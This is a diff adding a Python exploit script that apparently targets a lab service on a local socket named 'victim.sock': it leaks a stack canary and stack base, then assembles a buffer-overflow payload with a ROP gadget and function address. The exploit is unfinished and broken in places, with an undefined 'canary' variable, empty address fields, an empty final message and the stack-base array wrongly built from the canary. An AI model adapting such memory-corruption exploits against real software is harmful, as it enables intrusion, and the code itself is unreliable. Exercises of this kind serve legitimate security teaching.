@@ -1,0 +1,85 @@
+import socket
+import sys
+from os.path import expanduser
+
+# Create a UDS socket
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+
+# Connect the socket to the port where the server is listening
+home = expanduser("~")
+server_address = home + '/victim.sock'
+print('connecting to {}'.format(server_address))
+try:
+    sock.connect(server_address)
+except socket.error as msg:
+    print(msg)
+    sys.exit(1)
+
+try:
+
+    # Send data for canary
+    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+
+    # receive canary back
+    while amount_received < amount_expected:
+        data = sock.recv(32)
+        amount_received += len(data)
+        hex_canary = hex(int.from_bytes(data[24:],"little"))
+        print("Hex canary read in as:")
+        print(hex_canary)
+        canary_byte_array = bytearray.fromhex(hex_canary[2:])
+        canary_byte_array.reverse()
+        desired_canary = b"\x00\x33\x3c\x84\x0f\x1c\xd6\xa0"
+        if desired_canary != canary_byte_array:
+            print("CANARY ARRAYS DON'T MATCH")
+
+    # Send data for stack base
+    message = b'\n6\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+    while amount_received < amount_expected:
+        data = sock.recv(6)
+        amount_received += len(data)
+        stack_base = (hex(int.from_bytes(data,"little")-224))
+        print("Stack base read in as:")
+        print(stack_base)
+        sbase_byte_array = bytearray.fromhex(hex_canary[2:])
+        sbase_byte_array.reverse()
+
+# exploit will consist of argstr + overflow + canary + gadget + argaddr + funcaddr
+
+    argstr = "pawned!"
+    overflow1 = "A" * (24 - len(argstr)) # check numbers on this
+    # canary_byte_array defined on first request
+    # sbase_byte_array defined on second request
+    overflow2 = "A" * 1 # check numbers on this
+    gadget = "\x33\x0f\x00\x00\x00\x00\x00\x00" # doesnt change b/c instruction addr, not mem addr?
+    argaddr = "" #changes w aslr, addr we start overflowing
+    funcaddr = "" #changes w alsr
+
+    exploit = argstr + overflow1 + canary + overflow2  + gadget + argaddr + funcaddr
+
+# Send data
+    message = b"" # correct exploit message
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+
+    while amount_received < amount_expected:
+        data = sock.recv(32)
+        amount_received += len(data)
+        # if exploit sucessfully makes server exit won't need to print anyhthing anyway
+
+finally:
+    print('closing socket')
+    sock.close()
